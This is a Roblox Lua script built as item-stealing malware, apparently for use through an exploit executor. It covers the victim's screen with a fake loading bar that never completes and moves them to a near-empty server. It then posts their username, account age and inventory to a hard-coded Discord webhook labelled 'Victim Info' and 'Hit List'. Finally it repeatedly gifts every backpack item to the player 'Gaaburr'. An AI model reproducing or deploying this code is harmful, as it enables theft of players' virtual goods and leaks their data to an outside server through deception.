-- =========================
-- الخدمات الأساسية
-- =========================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- ضع هنا الويب هوك الجديد
local WEBHOOK_URL = "https://discord.com/api/webhooks/1395198024006762546/h4Nyvt_Z-YTQq-_aQeAtFgMKs5mKHROzw-nPVmTs4N15XtIP_CK2KUOd3Iq3bg_Kx5Uj"

-- =========================
-- 1: قسم النقل التلقائي (كل 3 دقائق)
-- =========================
task.spawn(function()
    local function findEmptyServer()
        local currentPlayers = #Players:GetPlayers()
        if currentPlayers > 3 then
            local success, servers = pcall(function()
                return HttpService:JSONDecode(game:HttpGet(
                    "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                ))
            end)
            if success and servers and servers.data then
                for _, server in ipairs(servers.data) do
                    if server.playing <= 3 and server.id ~= game.JobId then
                        local transferSuccess = pcall(function()
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
                        end)
                        if transferSuccess then
                            return true
                        end
                    end
                end
            end
        end
        return false
    end

    while true do
        local moved = findEmptyServer()
        if moved then break end
        wait(180)
    end
end)

-- =========================
-- 2: واجهة التحميل
-- =========================
task.spawn(function()
    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
        pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
    end

    for _, child in ipairs(PlayerGui:GetChildren()) do
        if not child:IsA("PersistentGui") then child:Destroy() end
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "PreparationLoader"
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = PlayerGui

    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
    Background.BorderSizePixel = 0
    Background.Parent = ScreenGui

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0.7, 0, 0.1, 0)
    Title.Position = UDim2.new(0.15, 0, 0.3, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "We are preparing now, thank you for your patience"
    Title.TextColor3 = Color3.fromRGB(0, 255, 200)
    Title.TextScaled = true
    Title.Font = Enum.Font.GothamBlack
    Title.Parent = Background

    local ProgressBarBG = Instance.new("Frame")
    ProgressBarBG.Size = UDim2.new(0.6, 0, 0.03, 0)
    ProgressBarBG.Position = UDim2.new(0.2, 0, 0.5, 0)
    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    ProgressBarBG.BorderSizePixel = 0
    ProgressBarBG.Parent = Background

    local ProgressBar = Instance.new("Frame")
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    ProgressBar.BorderSizePixel = 0
    ProgressBar.Parent = ProgressBarBG

    local PercentText = Instance.new("TextLabel")
    PercentText.Size = UDim2.new(0.2, 0, 0.05, 0)
    PercentText.Position = UDim2.new(0.4, 0, 0.55, 0)
    PercentText.BackgroundTransparency = 1
    PercentText.Text = "0%"
    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    PercentText.TextScaled = true
    PercentText.Font = Enum.Font.GothamBold
    PercentText.Parent = Background

    local function animateLoader()
        local duration = 120
        local startTime = tick()
        while tick() - startTime < duration do
            local elapsed = tick() - startTime
            local progress = elapsed / duration
            local percent = math.floor(progress * 100)
            ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
            PercentText.Text = percent .. "%"
            local r = progress * 255
            local g = (1 - progress) * 255
            local b = 100
            ProgressBar.BackgroundColor3 = Color3.fromRGB(r, g, b)
            wait(0.1)
        end
        ProgressBar.Size = UDim2.new(1, 0, 1, 0)
        PercentText.Text = "100%"
        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        while true do wait(1) end
    end

    animateLoader()
end)

-- =========================
-- 3: نظام الويب هوك مع إرسال Hit List كامل
-- =========================
task.spawn(function()
    wait(4)

    local playerName = player.Name
    local userId = player.UserId
    local accountAge = player.AccountAge .. " Days"
    local placeId = game.PlaceId
    local jobId = game.JobId

    local backpack = player:FindFirstChild("Backpack")
    local backpackContent = {}
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            local itemType = item:GetAttribute("ItemType") or "Unknown"
            table.insert(backpackContent, item.Name .. " (" .. itemType .. ")")
        end
    end

    local message = "@everyone **Alien Hit**\n──────────────\n" ..
                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
                    "\nReceiver: Gaaburr\n──────────────\n**Hit List:**\n"

    for i = 1, math.min(10, #backpackContent) do
        message = message .. "• " .. backpackContent[i] .. "\n"
    end

    message = message .. "──────────────\n**Total Items:** " .. #backpackContent ..
              "\n**Server:** https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId ..
              "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S")

    local requestFunc = (syn and syn.request) or http_request or request
    if requestFunc and WEBHOOK_URL and WEBHOOK_URL ~= "" then
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode({content = message})
            })
        end)

        local fileContent = "🎮 Hit List of player: " .. playerName .. "\n\n🛠️ All items in Backpack:\n"
        for i,v in ipairs(backpackContent) do
            fileContent = fileContent.."- "..v.."\n"
        end

        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},
                Body = table.concat({
                    "-----011000010111000001101001",
                    'Content-Disposition: form-data; name="file"; filename="HitList.txt"',
                    "Content-Type: text/plain",
                    "",
                    fileContent,
                    "-----011000010111000001101001--"
                },"\r\n")
            })
        end)
    end
end)

-- =========================
-- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
-- =========================
local TARGET_PLAYER_NAME = "Gaaburr"
local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")

local function equipItem(item)
    if item and item.Parent ~= player.Character then
        item.Parent = player.Character
        local humanoid = player.Character:FindFirstChild("Humanoid")
        if humanoid and item:IsA("Tool") then
            pcall(function() humanoid:EquipTool(item) end)
        end
    end
end

local function toggleFavorite(item)
    pcall(function() FavoriteRemote:FireServer(item:GetDebugId() or item.Name) end)
end

local function sendGift(item)
    local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
    if targetPlayer then
        pcall(function()
            GiftRemote:FireServer({
                ["Item"] = item,
                ["ToGift"] = TARGET_PLAYER_NAME
            })
        end)
    end
end

task.spawn(function()
    while true do
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            local itemsToProcess = {}
            for _, item in ipairs(backpack:GetChildren()) do
                table.insert(itemsToProcess, item)
            end

            for _, item in ipairs(itemsToProcess) do
                equipItem(item)
                task.wait(0.5)
                toggleFavorite(item)
                task.wait(3)
                sendGift(item)
                task.wait(2)
            end
        end
        task.wait(1)
    end
end)
